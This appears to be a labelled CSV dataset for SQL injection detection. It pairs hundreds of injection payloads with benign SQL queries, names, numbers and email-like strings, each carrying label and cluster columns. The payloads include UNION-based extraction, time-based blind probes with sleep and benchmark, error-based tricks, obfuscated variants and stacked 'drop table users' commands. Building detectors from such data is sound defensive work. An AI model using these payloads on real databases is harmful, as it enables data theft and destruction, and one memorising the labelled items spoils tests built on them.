Query,Label,cluster,stratify_col
"1'    or    if(substring(database(),    1,    1) =  'a',    sleep(5),    0)    ----rnghig22ggm8n0i",1,9,1_9
"1%'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  '%'  =  '",1,9,1_9
test'/*!12345*/or '1'='1'  # more_noise-- #y0k4fa4kiqtcs3l,1,9,1_9
valle de yerri/deierri,0,0,0_0
"%u0027union/*
*/select/*
*/1,2,3--
",1,0,1_0
select * from cry,0,5,0_5
"   select angry, men, money from section where throat  is null",0,1,0_1
9.56114e+015,0,3,0_3
select * from fact where brown between '1996-07-01' and '1996-07-31',0,5,0_5
select avg ( fruit ) from cream,0,1,0_1
test'/**/     or      '1'like'1'      /*      --      random_noise,1,9,1_9
"create username=identified by""'pass8o174'",1,0,1_0
shanta,0,8,0_8
select suggest ( s )  from attention select range from dream,0,1,0_1
select rich ( s )  from sail union all,0,1,0_1
select beauty ( s )  from locate select modern ( s ) ,0,1,0_1
"1'        union        select        table_name,        null,        null        from        information_schema.tables         and 'a'='a'----uhbj8xjg",1,9,1_9
carablanca,0,8,0_8
"1))union/*
*/select/*
*/1,database(),3--",1,0,1_0
1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,4,1_4
"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,4,1_4
test'||'1'in (1)'1',1,9,1_9
"-9133""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""crfy""  =  ""crfy",1,4,1_4
select * from cold 3,0,5,0_5
";droP
table
users;--
",1,0,1_0
castell-platja d'aro,0,0,0_0
"; if not  (_ substring  !(    (   select @@version  )  ,(select 25),(select 5)  ) ~Ã¢Â  not  like } (select 8)  )   waitfor delay '0:9:2'  and  true --",1,2,1_2
"0 and (select
0o0b0xa9c)=
	(^ select count  (` *	')   from sysusers as	sys5b0b0x0x0o0o6,sysusers/*t<*7pcsffbyb*/as sys2,sysusers%as
sys0o0x0x0o0o0b11,sysusers as@sys0o1,sysusers as sys5,sysusers:as{sys5,sysusers	assys7 and true or ""f""<>""f"" or false or (select (select (select (select 0)))) or 'd'='dy'# ) ?or[false and true and true]or?0b1110101800010 not like""(select (select 0x1eb0b0))  	  ? &&        true?or 0x0 or false and`trueand (select (select 0xdbb)) not like (select (select (select (select (select (select (select 0xdbc)))))))/*lpq*/and true or 0x0Ã¢Â --:r-",1,4,1_4
select * from her where yes between deep09/01/1996slept and division15/31/1996aware,0,5,0_5
select peace ( s )  from aware union all,0,1,0_1
" ([ selectÃ¢Â *`from;  (/**/^select ?(%*sleep  (  0o0b0b10o8b8o0x9   )</  )`]   )*~srmq/*a!tz*/ ) 
	  and     ( Ã¢Â   ( Ã¢Â 0b0x0b0o0b6o2o0b8b1011103154180 [=?`0x0o0b0b10018111100110",1,2,1_2
1%'   )    )    union all select null--,1,4,1_4
traveria morera,0,8,0_8
"1""   )    )    as jgie where 8017  =  8017 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",1,4,1_4
"selectcount./*gsg=p;'d3s	nl
c8fpe*/('}*!%)};\from/*nlpoql7=~k;4aqm)nb&*/rdb$fields
as:t0b7x7o0b1001,rdb$typesas*t9b0,rdb$collations*as>t8x3o3,rdb$functions:as%t0b9o0o2o3{and`]]([$'qfls'{>like[~'qfls",1,9,1_9
"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,4,1_4
' and 1=1 -- ,1,6,1_6
"""   ) %^ )	Ã¢Â   or^benchmark-[(  (select 0x7x9d2a60),md5  (/**/ 4b2b9 : )   Ã¢Â )  .  or (select (select (select 3x9))) and (select 1x1)Ã¢Â  or  false or false or false and (select (select 1))#zc",1,2,1_2
7636020000000000,0,3,0_3
trenaman_bourbault@sms24h.ar,0,0,0_0
guasca,0,8,0_8
"1'   )    )    as wves where 2641  =  2641 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,4,1_4
"1'      and      substring(database(),      1,      1)        =	      's'      --",1,9,1_9
' o/**/r exists(select 1 from users)--,1,0,1_0
select * from receive fetch first 3 rows only,0,0,0_0
"1""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""iuxs"" like ""iuxs",1,4,1_4
"1' and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,4,1_4
"-6883""  )   as tbai where 8121  =  8121 union all select 8121,8121,8121,8121,8121,8121,8121,8121--",1,4,1_4
48825670m,0,3,0_3
"select * from users where id  =  (select (select 3x1)).<@ or 0x1$ like  0b1 and ""		c""<>""		cw"" or (select (select 0)) or false -- 2",1,4,1_4
"1  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  9841  =  9841",1,1,1_1
select * from instead order by atmosphere desc,0,7,0_7
select * from program where tower not like '[second]%',0,7,0_7
"-4571' union all select 3227,3227,3227,3227--",1,4,1_4
"0b0b1'  or? /xwz*/'*/ (  select`'cozi'?from dual where 0o0xa2f, like  0xa2f and	0b0x55bc like   ( +select count ^( \* [)   from all_users t0o1,all_users t6o4,all_users t0o3,all_users t4,all_users}t5  )  or false or ""0b0&"" not like ""2&"" and (select 0o0x215f) like 0x29eb or false or ""t;""?like ""t;8"" or)false or.(select (select 0x748))( like  (select (select (select (select 0x799))))* &&  true orÃ¢Â false or false or false --",1,2,1_2
' or 1in (1)1  # more_noise-- ,1,4,1_4
select wp_posts.* from wp_posts where id in  ( 367656 ) ,0,7,0_7
"1""  
)(+  )    as<uaxn where 6x1614! like @(select (select (select (select (select (select 5657)))))) rlike   ( _select
 /*p~(*/( {case when 	 ( 	(select (select (select 6538))) like 0b1x0o0o1c56  )Ã¢Â $ then 0x0o5 else 0b0x0o25 end   )  "" ) )'  &&; [0x1&&
true:or 0x0o4 and 8x0b0b110 and 5x8b0x2=not like 0x0o1c3b  &&  (select (select (select (select (select (select 1)))))){ or  false &&*true or false  &&/**/ true  or  false or '2' not  like  '2' --",1,4,1_4
'/*!12345*/|| exists(select 1 from users)--,1,2,1_2
brait_burbridge@fichajes.nom.ic,0,0,0_0
1526,0,3,0_3
"0b1'+ -(+ select dpkp where 0b0b1110101010110110111010010111001111000100/**/ like  (select (select 0x12e4)) and sleep (  (select 0x1).+"")^ <[)   +'",1,9,1_9
"or~(select<(select~(select	(select (select 1)))))= (select 0o0x5) and ""k""  like` ""k""  and  0o5x0x1##@a",1,4,1_4
edelweis,0,8,0_8
select * from doll fetch first 3 rows only,0,0,0_0
select * from pack fetch first 50 percent rows onlyselect top 3 * from furniture,0,0,0_0
1        and        1 =	1,1,6,1_6
"1'||  (  select 'skds' from dual where 8594  =  8594 and make_set  (  6779  =  2027,2027   )    )   ||'",1,9,1_9
select dress ( s )  from fence full outer join,0,1,0_1
"' union select null, null, null  ANd 'a'='a'-- ",1,9,1_9
"1""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""ampn"" like ""ampn",1,1,1_1
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'cbaj'  =  'cbaj,1,4,1_4
"1%u0027%u0020union%u0020select%u0020table_name,%u0020null,%u0020null%u0020from%u0020information_schema.tables%u0020--",1,2,1_2
canal dolcet,0,8,0_8
41217479f,0,3,0_3
select * from farther where that = 'gradually' limit 3,0,5,0_5
-4961'  )   or 3038  =  3038,1,6,1_6
%u0027%u0020and%u00201=1%u0020/*!*/or 'b'='b'--%u0020,1,2,1_2
"0x1'  &&  row (  (select(select 3437)),(select 0x1d2d)  )  >^ (  select count  ((<*  )  ,concat  (  0x7171707a79,  (  select  Ã¢Â ( .elt  (  (select 0x185b)    like    9x185d,(select 0x1)   )    )     )  ,0b0o0x0o1315a767a77,flo  or    (? r and   (  (select (select 0)) +)  *0x2   ) Ã¢Â   )/*p4(gzt!j2?xle*/  x from   ( select (select~0x1448);union>select 3785_union select 0xf5b:union select (select 0x1bf2)  )/*yf)*/ a group by:x  )  ",1,4,1_4
pancracia,0,8,0_8
"1' or ascii(substring(database(), 1, 1)) > 100 --#ute70c3rt0x",1,0,1_0
"1  )  and 0x17a0o7 ,=  ctxsys.drithsx.sn  (  0x0o0o0b0b0b0b1101000011001001011101100101101001011100010001011000010111000001101900110000101090000000105000101101011101010101000101010010010011,  ()	chr	 (  (select (select 0xd0o10))/))  or""chr= (  (select (select (select (select 0x49))))  )   or chr&]( +(select.0x70)-$)   or chr~+(  0b0b100001100110011010010 })   )or  chr  (  (select;9x0o114).[) or/*(select 0b0x5))lbt0o15	g3^(select (select 1))*ad8a*/(  select   (  case{when  %(@_0x17a7=(select((select (select?(select 0o0x17a7))))  )[  then{(select?(select (select (select (select]0b11)))))>else~0x0o0;end Ã¢Â )|  from dual; ):   or  chr  (  0o0x8o63} )  ,||&chr{=(  0x0o7a  ) '||chr= (  (select 0o166)  ) 	 or chr  (  (select<0xde)  ) ;  or  chrÃ¢Â ,(/ (select 0x0o0o0b1101011)   )   +)    )  ",1,4,1_4
-2429%' or 6890  =  5846,1,6,1_6
"6b0b1011x5x5'  or  (select 0b0o15811)}  like,    ( +select[0b10o0b0o0b11101110111011 from pg_sleep  (~
(select 0x0o5)/**/  )    )   |and 'dogx' like}'dogx",1,9,1_9
"-9487   )    )    as rvck where 9404  =  9404 or make_set  (  8921  =  6045,6045  )  --",1,6,1_6
"  select orders.yourselfrid, employees.hit, employees.birthday from ordersright join employees on orders.employeeid  =  employees.dutyid order by orders.cabinid",0,1,0_1
necforo,0,8,0_8
1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'yvxg'  =  'yvxg,1,9,1_9
antone1@tiendasyofertas.ve,0,0,0_0
select * from without where car = 'especially'  or tears = 'southern',0,5,0_5
telema,0,8,0_8
'  or  '1' = '1,1,9,1_9
4562,0,3,0_3
"1""_where (select 0x50f9)  like  0o0x10f0b0b1111101001and0o1x0x1122 like""utl_inaddr.get_host_address  (: chr ](= (select (select (select (select (select (select (select 113))))))) ,)  ||chr  (  (select (select (select 113)))  )  ||chr (  112 /**/)  ||chr ;(  0o152_ )   or chr  (  1x139  )  or% ( ?select   (
 case when   (  (select 0x0o2142)  like  0x1128? )`  then (select 0b0x4x1)]else (select (select (select (select 0)))) end \)\  from dual. )   or chr; (  (select;1b1110401)  ) /**/ or chr  ( *2x0b113a  )   or chr *(  (select (select)0x36)) /*a;*cnq*/)  ||chr 
(~ 0b0o0b1111111010011111011110  )% ||chr  (  (select 0x0x75)   )    )   or	""b"" not like ""b"",  ' or  : false[  or   false     and    ((select (select (select (select 1))))=or 0x216e not  like  (select (select (select 0x21ca))) and true or false  or )(select 0x109a) like 0o0o0o0b10011111111001  or  false or (select (select 0))    and    true or 0x26be=0x26bf and 6753 not	like 0x1a62 or false or false or false or false --",1,4,1_4
1  )   and sleep  (  5  ) ,1,4,1_4
"1  )   where 4374  like  0x0o0o25ba or row  (  (select (select 1065)),(select (select (select (select 7562))))  )  > +(  select	count  (  *  )  ,concat &(  0x7171705a0x47,  (  select [(  elt  (  (select (select 1045)) like+(select (select.1045)),0x1   )    )    !)  ,0x0x0o0x2cda0b0o1377a0x47,floor  (  r and  `(  0o0b0x0  )  *(select (select/**/0))   ) {  )   x from.  (  select8488 union select 0b0b0xeb2f4ed502 union select 0b0xbeb union select (select 5x4ba) )  a group by x  )  and\true and true and trueor false and true && 1 or false and true --",1,4,1_4
1%'  )   and sleep  (  5  )   and   (  '%'  =  ',1,9,1_9
select former ( s from heavy right join,0,7,0_7
;/**/drop/**/table/**/users;/**/--#11r5c46,1,0,1_0
"insert into behavior  ( becoming, bound, aloud )  values  ( 'nearby', 'business', 'party' )  ",0,1,0_1
"1%"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""%""  =  """,1,1,1_1
a4561o9nz68,0,8,0_8
"1""  )   where 2278  =  2278",1,6,1_6
lauraine,0,8,0_8
meleskie,0,8,0_8
test'/**/or '1'='1' --,1,9,1_9
"1%'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   '%'  =  '",1,9,1_9
select count ( distinct him )  from thou,0,1,0_1
'/**/|| '1'='1,1,9,1_9
select dark ( s )  from read select charge from cabin,0,1,0_1
"1 where 8273  =  8273 union all select null,null,null,null,null,null,null,null#",1,4,1_4
"1' or ascii(substring(database(), 1, 1)) > 100 ----ean8n6vy1",1,0,1_0
"select count,;(  *
 )//*$(select (select (select`(select (select 0b0x0o1x0b0o0b0b0b1)))))!__<qgp?6*/ from sysibm.systables\as/*c;;*/t5,sysibm.systables as;t6,sysibm.systables as t4`  and%;<]""(
}""ihqf""`	==""ihqf",1,1,1_1
"1""_	) $  or  (select&(select (select (select/(select (select/*`$*/(select;(select 3643))))))))=Ã¢Â _(  select count  ( (*  )& from domain.domains@as`t9x0o0,domain.columns as~t0o36,domain.tables,as t0x0x6_ )/*kz0g*/   and/*yra*/ +!(  ""vudj"";like ""vudj",1,2,1_2
select * from region where leg between 'dance' and 'such',0,5,0_5
michell4@so-tel.jobs,0,0,0_0
select flag from directly union all select combination from swim order by triangle,0,7,0_7
-8652'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1,4,1_4
"0b0""; )   and (select (select (select (select 0o14110))))=
 (
'qqpjq'  or ; ~(
 select case 0x0o3543|when 0x1860 then 0x9b1 else!(select/*z0fg)!o*/9x0)+end from rdb$database: ) > or 'qzvzq' ])	     &&?[  
 () ""liar""""%like  ""liar",1,2,1_2
09301966f,0,3,0_3
select option_value from wp_options where option_name  =  '_houzez_property_type_3146' limit 1,0,5,0_5
64sfa4imiento,0,3,0_3
select * from brush fetch first 50 percent rows only,0,0,0_0
"1' where 4334  =  4334 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,6,1_6
"
*	or
/*;s0b0o3psi~*gj{p*/@true--",1,0,1_0
9824,0,3,0_3
2am901to,0,3,0_3
"1'   ) { )     )
  and make_set  (  0x9b10001ce    like    (select (select (select (select (select 2929))))),(select+(select (select 2429)))  )   and   /*ow*/(  /**/( <   (  'gkyo'='gkyo",1,9,1_9
"1%""   )    )    or updatexml  (  (select (select (select (select (select (select (select 0x780))))))),concat  (  0x0b0x0x2e,0o10x7171506a01,  () select?  (* elt 
( ^(select (select.(select (select (select 1808)))))  like ,0x718,0x0x1 ( )    ))    ) %,0x927a0x2e1a0b0b0o107  )  ,(selectÃ¢Â (select 0x21da)) }) and  ( /  (   ""%"" <=  """,1,4,1_4
"0b1'+ 
(	\select 'xqjx'""where (selectÃ¢Â (select (select 0b1101110001051))):==?0o15610 and (select<0x23ee) or~false`&& (select (select (select (select 1))))   &&  #true or/*\br{*/0x0 and true#:=Ã¢Â  (select
(select 0x23c0o1))--=r`5",1,2,1_2
"' and extractvalue(1,concat(0x5c,version())) or (1)--",1,0,1_0
"1'		or		ascii(substring(database(),		1,		1))		>		100		--",1,0,1_0
"5~:) )=as\ihan]where/*bfi*/(select 0b0x1485)/*(select (select 0o5))@(select 0x5)*/like
0o0b1018010110010and[elt  (^/**/0b5x43bb  like| 0x0b0b1100111000110110101100010011110010001,(select0xf27), )  or-(select 0b0x0b0)]or_0x0 or 0x9a6 not like 2470 --",1,4,1_4
test' or '1'<='1' -- ,1,9,1_9
 update rubber set instead = 'brain'where spite = 'coach',0,5,0_5
"3'+  (  select 'iqxn' where 0x736  like] (select 0x47a)  and *0b0xe83 in;   (    (   char  (  (select (select(select 0x71)))  )  +char  (  0o131  )@ +char  (  (select (select (select (select (select (select 112))))))  )  +char  (  8x6a /)  +char ,(@ (select (select (select (select 0x71))))  )  +  (  select  :(  case when   (  (select (select 0xc61))  like  0xc61  )+  then:char  (  (select (select 0o11))  )   else char  (\ (select (select (select (select 0x30))))  )   end   )    )   +char  (  0x0o2c9  ) &+char  ( )0xa2  ) {+char  (  (select 0x8a)  )  +char @(  0x0b111a  )  +char/*poo*/ (  0b2112704   )   |)  
   )`   )   +'",1,9,1_9
43391,0,3,0_3
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  8997  =  8997",1,4,1_4
"0b0o4"" where:0xecc _= ](select 0b0x162e)/*|d4\
p**/and/*pe*/0x4758  like  dbms_pipe.receive_message`(/*a*/ chr  (, (select 0o0x0x1) /*(select (select (select;(select 0x9))))}*/)   or chr_ (?>0x0x0x0o0x0b11530^ )  	 or  chr  ( ](select>(select 0x75)) !)   or)chr|$(	}0o0o0o0o0o0o145  )/ ,0o0x0b0o5[ )   or  false& or
 5x6 and'k' not like 'kh' or 0o0 and (select 0x1)%and[0o622<>0b0x0x4xc5{or false and 0x1<and 8x1248 not like`(select,(select/0x11f9)) or
0b873101071011 not like 0b111101011011!    and   ? 'h'='h' or 0x0 or false or/""m"" not *like  ""m"" ~and  ""/h""Ã¢Â not like ""/hr"" or false   or   false or false and (select (select (select (select 1)))) or[false or false and true and (select (select (select (select 1))))  &&  (select;0x1) and 1 or false or (select (select 0xb3b)) not like (select (select 0875)) or false --/2",1,4,1_4
1  )]  where (select 0b0b10000001001110111001011001111111110101110)  =	{6424,1,4,1_4
"1"",where0b0o0x0x0b11110111d[_=/**/^0o22175",1,2,1_2
from  ( select distinct terrible from roar ) ,0,7,0_7
gracomda7,0,8,0_8
depredador,0,8,0_8
"0o3'_or <$(  select 'epjf'>from}dual where~2x8184@@like>13093120020101|and@0o0b0o3b0x0o1fdf== &(/* njq4ozqstp)h&:gmfcbe9
*k`7tf
!$@go */^select count (
 *
)[, from>sysibm.systables}as:t1,sysibm.systablesas+t0o0o0o0x6,sysibm.systables""as t3 /)_ ;and  (select 8x0o0x1)Ã¢Â or false `and/ ""flr~"" <> ""flr~@"" or (select 0o0x4f06) not  like  (select (select~(select 1x1bc6)))`and%trueand""["" like ""[""_or false{or false and;true orfalse and '' <>,'j' or (select 0x15b3)=(select 0x15b4)!or\false*<   && > , ""ym"" not like ""ym3""{--",1,2,1_2
"4 where*0x1439  like  (select (select (select 2269))) ^and  0b0xeaa  like    (  select%upper  (  xmltype  (  chr  ( {(select (select 0o0o74))  )  ||chr ;(  (select 0x35)[ ) /||chr  (  (select 0o161){ ) ^||chr<(/*	0x0(j@@'u*/ (select 0o0o0x81)  )  ||chr  (  (select (select 0x8e))  )  ||chr"" (  (select (select 0xa0o10))  )  ||chr  (  113? ) or^(  select   (^ case when { (Ã¢Â  0x0xeaa: like  (select 0b0o1473025733562)| )   then 0x8x1 else (select 0o0) end  )   from dual  )  ||chr)<( `0o161 ~)   or chr  (  (select (select (select (select (select 122)))))  )  ||chr  (] 0x76 !)  ||chr  (  (select (select (select (select (select (select 135))))))  )  ||chr  (  (select (select;113))  )  }or chr  ( 0x3e > ):   )  
  )   from dual  )? and (select (select (select 0o0x1))) or '0x0b18'<>'0' and true  or 	false or false or (select 0x351e)<>0o0x0x101e  or"" ""o\"" not like ""o\"" or (select (select (select (select (select (select 0))))))&&true or false or false and true  or	 2x0 or (select (select (select 0x0))) or 0x0 and true and true  or  false or false and true or 3772<>3772 --",1,4,1_4
alek,0,8,0_8
select option_value from wp_options where option_name  =  '_transient_timeout_sm::is_connected_to_gs' limit 1,0,5,0_5
"' union select null, null, null -- ",1,4,1_4
"1""   )    )    as luon where 4676  =  4676 rlike sleep  (  5  )  #",1,6,1_6
"1' un/*!12345*/ion select table_name, null, null from information_schema.tables --#3qc68axb1",1,0,1_0
"0o0o0o1""\, )~
 )   `as maxe(where}(select 0x0o13372)  like  (select (select (select 0x22b3))) union\all]select
null,null,null,null,null,null,null,null,null /*jng0*/  or   .false  and 
9x9 {or |(select 0b1011110100110) not like (select 0x18c2)  or :0b7x0 or 9o0o0x0o0o0x1fda like:0b10010511311011  or/**/ false;  and  {0x0b1100b2 not like 0x0x80band true&&true or|false and (select (select(select (select (select (select 8562)))))) like (select (select (select (select 0562)))) and true and true and true#kgfg}h)",1,4,1_4
select count ( distinct dry )  from sister,0,1,0_1
select * from till  where certain = leaf,0,5,0_5
%u0027%u0020and%u00201<=1%u0020-- ,1,2,1_2
select * from arrive where time  between 10 and 20,0,5,0_5
1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'qiau'  =  'qiau,1,9,1_9
"1' xor substring(database(), 1, 1) like 's' --",1,9,1_9
"1%'   ) ^ )    and extractvalue (  (select (select (select 0x6f2e))),concat  (  0x5c,4x8571006a0o607,  (  select   (@ elt  (  0x1f2e=(select (select 0x26fe)),(select (select 0x1))   ) "" ;)     )  ,0x717a767a37   ) *  )    and    (    ( ~	'%'     &&  true  or  false or false and true or false and (select 1548) not like (select 1549)#=    '",1,9,1_9
"-9864""  )   or elt  (  5885  =  4936,4936  )   and   (  ""bfbb"" like ""bfbb",1,4,1_4
"1'  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1_1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",1,1,1_1
"1and
1=1
",1,6,1_6
"select /**`av0o40rv&!s*/	(  case=when - (  8x140a ?like  (select (select (select (select (select 1720)))))  )   then:0x14aa else (select 0x1)/  (( select	(select (select 1))  )   end  )  or false  or/**/ ""s""<like ""s|"" and ""4y"" not=""4ya""  or  ""_"" like ""_r"" and true --",1,4,1_4
select * from let,0,5,0_5
select bell ( s )  from main,0,1,0_1
; select pg_sleep(5);  and 'a'='a'--,1,0,1_0
2783,0,3,0_3
"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'nqam'  =  'nqam",1,9,1_9
; DRop table users; ----rixyvl9cg4,1,0,1_0
; drop table users;  xor 'b'='b'--,1,0,1_0
" select * from swimming order by slept asc, closer desc",0,7,0_7
select * from  ( select announced from knew ) ,0,7,0_7
"1 where 5859  =  5859 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1_1
' and 1in (1)1 -- ,1,4,1_4
v9n939z6,0,8,0_8
"1""  )   where 4520  =  4520",1,6,1_6
"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'gmil'  =  'gmil",1,9,1_9
collado mediano,0,8,0_8
"   select tail, compass+ ', ' + farther+ ' ' + ago+ ', ' + victory as involved  from frog",0,5,0_5
"/**/and+(select (select 2))  =+(selectÃ¢Â 4),)`.	union=all",1,2,1_2
select top 3 * from say,0,5,0_5
"c/ padilla, 74 12h",0,0,0_0
"0b0o1'|) ; asybuv?where
0x11db $	like
<?0x0o0b0b0b1010001111111101110111101100106100/**/union all*select`null,null,null,null,null,null,null,null--",1,4,1_4
di rado elejalde,0,0,0_0
"1%'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  '%'  =  '",1,9,1_9
"1""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""yrgy"" like ""yrgy",1,4,1_4
"'0:0:5' or (1)--
",1,4,1_4
users;--,1,0,1_0
romanones,0,8,0_8
select * from fill where want = 'fellow'  or mad = 'making',0,5,0_5
"1%""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""%""  =  """,1,4,1_4
"1'  )   where 2121  =  2121 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1_1
"1'||  (  select 'fqoz' where 9794  =  9794 union all select null,null,null,null,null--",1,4,1_4
"1%u0027%u0020and%u0020substring(database(),%u00201,%u00201)%u0020like%u0020%u0027s%u0027%u0020--#hxgt391re",1,2,1_2
hammong4@asyra.st,0,0,0_0
"1%u0027/**/o/**/r/**/if(substring(database(),/**/1,/**/1)=%u0027a%u0027,/**/sleep(5),/**/0)/**/--#75b00qasq9t3",1,0,1_0
";select/*
*/pg_sleep(5);/*
*/--",1,0,1_0
margheri,0,8,0_8
25187,0,3,0_3
 (  select   (  case when   (  5792  =  5792  )   then 5792 else 1/  (  select 0  )   end   )    ) ,1,4,1_4
select * from dinner where price not between 10 and 20,0,7,0_7
"1' where	0xe0x9c$=/*;m)}lg}a^sfjf*/0xe1c and 	 (  select~3x536b from  ( \select count /**/(  *  )  ,concat  (  0x7171706a70,  (  select   (  elt  (  (select 0x234b)=(select (select 0x0xecb)),0x6! )
   )    !)  ,0x0o1315a0x2ffa71,floor 	(| rand  (  (select (select (select (select 0))))  )+ *0x2)  )  , )  ~x from inf or=mation_schema.character_sets group by x !) ;a  )      ~&&      true or (select 0x6)  or  false and true and 'hd' not like 'hdj' or (select (select (select (select (select 0))))) --",1,4,1_4
select * from basket where kind not between 'contrast' and 'silly',0,5,0_5
 (  case when 5640  =  5640 then 5640 else null end  ) ,1,6,1_6
gaylor,0,8,0_8
"/*o5o0x0b0x4b0x1b0x0o53d`y}+s0o6/ufklqw<pu3qs>f*/or
pg_sleep$_(%.__time__/*u!bg*0b0x2b51b9b0qq;zg=i_2eejei;*/,)]&--",1,2,1_2
7860000000000000,0,3,0_3
"  select becameid as id, common as shoe from now",0,7,0_7
"' union select 1,2,3--",1,4,1_4
select count ( fierceid ) from safety,0,1,0_1
basile@europop.by,0,0,0_0
fickes,0,8,0_8
"1%'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1_1
willie51,0,8,0_8
"0o0o0o1'> or;)[Ã¢Â (: select^'xjcg'fromÃ¢Â dual*where 0x16b7:like 0x16b7Ã¢Â union$all]select,null,null,null^or*'ph' notÃ¢Â like.'ph'{or false#hb
ku7b101buq0jdo",1,9,1_9
'/**/or/**/1like1/**/ or (1)--/**/,1,0,1_0
"1'orif(substring(database(),/*
*/1,/*
*/1)='a',sleep(5),0)--",1,9,1_9
45810,0,3,0_3
declare @s varchar   (  8000  )   select @s   =   0x73656c ...,1,0,1_0
